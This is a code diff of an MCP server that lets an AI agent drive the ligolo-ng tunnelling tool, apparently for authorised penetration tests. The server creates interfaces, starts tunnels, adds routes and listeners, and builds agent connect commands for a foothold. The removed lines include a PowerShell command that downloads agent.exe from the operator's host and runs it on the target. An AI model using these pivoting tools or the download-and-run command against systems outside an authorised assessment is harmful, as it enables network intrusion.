+      if (id === null) return handleAgents();
+      return agentDetail(String(id), await requireAgent(api, String(id)));
     }
-
+    case "ligolo_interface_create": {
+      const iface = str(args, "name", cfg.interfaceName);
+      log(`ligolo_interface_create ${iface}`);
+      const created = await api.createInterface(iface);
+      return { scope_checked: false, interface: iface, message: created.message, interfaces: await api.interfaces() };
+    }
+    case "ligolo_interface_list": {
+      const interfaces = await api.interfaces();
+      return {
+        scope_checked: false,
+        interfaces: Object.entries(interfaces ?? {}).map(([name, rec]) => ({
+          name,
+          active: rec.Active,
+          routes: rec.Routes ?? [],
+        })),
+      };
+    }
+    case "ligolo_tunnel_start":
+      return handleTunnelStart(args);
+    case "ligolo_tunnel_stop": {
+      const agentId = str(args, "agentId");
+      log(`ligolo_tunnel_stop agent=${agentId}`);
+      const stopped = await api.stopTunnel(agentId);
+      return { scope_checked: false, agent_id: agentId, message: stopped.message };
+    }
+    case "ligolo_route_add":
+      return handleRouteAdd(args);
+    case "ligolo_route_delete": {
+      const network = str(args, "network");
+      const iface = str(args, "interface", cfg.interfaceName);
+      log(`ligolo_route_delete ${network} dev ${iface}`);
+      const removed = await api.deleteRoute(iface, network);
+      return { scope_checked: false, network, interface: iface, message: removed.message };
+    }
+    case "ligolo_route_list": {
+      const interfaces = await api.interfaces();
+      const routes = Object.entries(interfaces ?? {}).flatMap(([name, rec]) =>
+        (rec.Routes ?? []).map((r) => ({ interface: name, destination: r.Destination, active: r.Active })),
+      );
+      return { scope_checked: false, count: routes.length, routes };
+    }
+    case "ligolo_listener_add":
+      return handleListenerAdd(args);
+    case "ligolo_listener_list": {
+      const listeners = (await api.listeners()) ?? [];
+      return { scope_checked: false, count: listeners.length, listeners };
+    }
+    case "ligolo_listener_delete": {
+      const listenerId = num(args, "listenerId");
+      const agentId = str(args, "agentId");
+      if (listenerId === null) throw new Error("listenerId is required (from ligolo_listener_list)");
+      if (agentId === "") throw new Error("agentId is required — listeners are addressed per agent");
+      log(`ligolo_listener_delete agent=${agentId} listener=${listenerId}`);
+      const deleted = await api.deleteListener(agentId, listenerId);
+      return { scope_checked: false, agent_id: agentId, listener_id: listenerId, message: deleted.message };
+    }
     case "ligolo_certificate_fingerprint": {
-      try {
-        const { stdout } = await sshExec("grep -i fingerprint /tmp/ligolo-proxy.log | tail -1 || echo 'Fingerprint not found in log'");
-        return `Certificate Fingerprint:
-${stdout}
-
-Use this fingerprint with the agent's -accept-fingerprint option for secure connections.`;
-      } catch (error) {
-        return `Error getting fingerprint: ${error instanceof Error ? error.message : String(error)}`;
-      }
+      const fingerprint = certFingerprint(cfg);
+      return {
+        scope_checked: false,
+        fingerprint,
+        path: `${cfg.selfcertDir}/${cfg.selfcertDomain}_cert`,
+        usage: `agent -connect <operator>:${cfg.proxyAddr.split(":").pop()} -accept-fingerprint ${fingerprint}`,
+      };
     }
-
     case "ligolo_agent_command": {
-      const proxyIp = args.proxyIp as string;
-      const port = (args.port as string) || PROXY_PORT;
-      const ignoreCert = args.ignoreCert !== false;
-      const fingerprint = args.fingerprint as string;
-      const useWs = args.useWs === true;
-      const retry = args.retry !== false;
-
-      let cmd = `./agent -connect ${proxyIp}:${port}`;
-
-      if (fingerprint) {
-        cmd += ` -accept-fingerprint ${fingerprint}`;
-      } else if (ignoreCert) {
-        cmd += " -ignore-cert";
-      }
-
-      if (useWs) {
-        cmd += " -ws";
-      }
-
-      if (retry) {
-        cmd += " -retry";
-      }
-
-      const windowsCmd = cmd.replace("./agent", ".\\agent.exe");
-
-      return `Ligolo-ng Agent Commands:
-
-Linux/Mac:
-  ${cmd}
-
-Windows:
-  ${windowsCmd}
-
-PowerShell (download and run):
-  Invoke-WebRequest -Uri "http://${proxyIp}:8000/agent.exe" -OutFile agent.exe; .\\agent.exe -connect ${proxyIp}:${port}${ignoreCert ? " -ignore-cert" : ""}${retry ? " -retry" : ""}
-
-Notes:
-- Make sure the agent binary is transferred to the target
-- Use -retry for automatic reconnection
-- Use -ignore-cert only in testing (fingerprint verification is more secure)`;
+      const proxyIp = str(args, "proxyIp");
+      const port = str(args, "port", cfg.proxyAddr.split(":").pop() ?? "11601");
+      const retry = bool(args, "retry", true);
+      const useWs = bool(args, "useWs", false);
+      const debugIgnore = bool(args, "debugIgnoreCert", false);
+      let fingerprint = str(args, "fingerprint");
+      if (fingerprint === "" && !debugIgnore) fingerprint = certFingerprint(cfg);
+      const flags: string[] = [];
+      if (fingerprint !== "") flags.push(`-accept-fingerprint ${fingerprint}`);
+      else if (debugIgnore) flags.push("-ignore-cert");
+      if (useWs) flags.push("-ws");
+      if (retry) flags.push("-retry");
+      const linux = `./agent -connect ${proxyIp}:${port} ${flags.join(" ")}`.trim();
+      const windows = `agent.exe -connect ${proxyIp}:${port} ${flags.join(" ")}`.trim();
+      return {
+        scope_checked: false,
+        linux,
+        windows,
+        pinned: fingerprint !== "" && !debugIgnore,
+        warning: debugIgnore
+          ? "-ignore-cert accepts any MITM between foothold and operator. Debug only; re-issue without debugIgnoreCert."
+          : null,
+        cleanup: "Log the uploaded agent binary in state/cleanup-pending.md the moment it lands on the foothold.",
+      };
     }
-
-    case "ligolo_send_command": {
-      const command = args.command as string;
-      return `To send command "${command}" to ligolo-ng:
-
-Option 1: Use screen/tmux session
-  screen -S ligolo
-  (send command: ${command})
-
-Option 2: Use the API (if enabled)
-  curl -X POST http://kali:8080/api/command -d '{"command": "${command}"}'
-
-Option 3: Direct console access via SSH
-  ssh kali -t "screen -r ligolo"`;
-    }
-
+    case "ligolo_teardown":
+      return handleTeardown(args);
     default:
-      return `Unknown tool: ${name}`;
+      throw new Error(`unknown tool: ${name}`);
   }
 }
 
-// Create and run server
-async function main() {
-  const server = new Server(
-    {
-      name: "ligolo-ng-mcp",
-      version: "1.0.0",
-    },
-    {
-      capabilities: {
-        tools: {},
-      },
-    }
-  );
+async function main(): Promise<void> {
+  const server = new Server({ name: "ligolo-ng-mcp", version: "1.1.0" }, { capabilities: { tools: {} } });
 
-  // List tools handler
-  server.setRequestHandler(ListToolsRequestSchema, async () => {
-    return { tools };
-  });
+  server.setRequestHandler(ListToolsRequestSchema, async () => ({ tools }));
 
-  // Call tool handler
   server.setRequestHandler(CallToolRequestSchema, async (request) => {
-    const { name, arguments: args } = request.params;
-
+    const { name, arguments: rawArgs } = request.params;
+    const args = (rawArgs ?? {}) as Args;
     try {
-      const result = await handleToolCall(name, args as Record<string, unknown> || {});
+      const payload = await handleToolCall(name, args);
+      return { content: [{ type: "text" as const, text: JSON.stringify(payload, null, 2) }] };
+    } catch (err) {
+      const gateRefusal = err instanceof GateError;
+      const message = err instanceof Error ? err.message : String(err);
       return {
         content: [
           {
             type: "text" as const,
-            text: result,
-          },
-        ],
-      };
-    } catch (error) {
-      return {
-        content: [
-          {
-            type: "text" as const,
-            text: `Error executing ${name}: ${error instanceof Error ? error.message : String(error)}`,
+            text: JSON.stringify(
+              {
+                error: gateRefusal ? "checkpoint-denied" : "failed",
+                tool: name,
+                message,
+                ...(gateRefusal ? { exit_code: err.code, action_taken: false } : {}),
+              },
+              null,
+              2,
+            ),
           },
         ],
         isError: true,
@@ -700,11 +660,13 @@ async function main() {
     }
   });
 
-  // Connect to transport
-  const transport = new StdioServerTransport();
-  await server.connect(transport);
-
-  console.error("Ligolo-ng MCP server running on stdio");
+  await server.connect(new StdioServerTransport());
+  // stdout is the MCP stream; diagnostics go to stderr only.
+  console.error(
+    `ligolo-ng-mcp 1.1.0 ready — api=${cfg.apiUrl} ` +
+      `assessment=${cfg.assessment || "<unset>"}(${cfg.assessmentSource}) ` +
+      `read_only=${cfg.readOnly} tools=${tools.length} framework=${cfg.bitoriaRoot ?? "<not found>"}`,
+  );
 }
 
 main().catch((error) => {
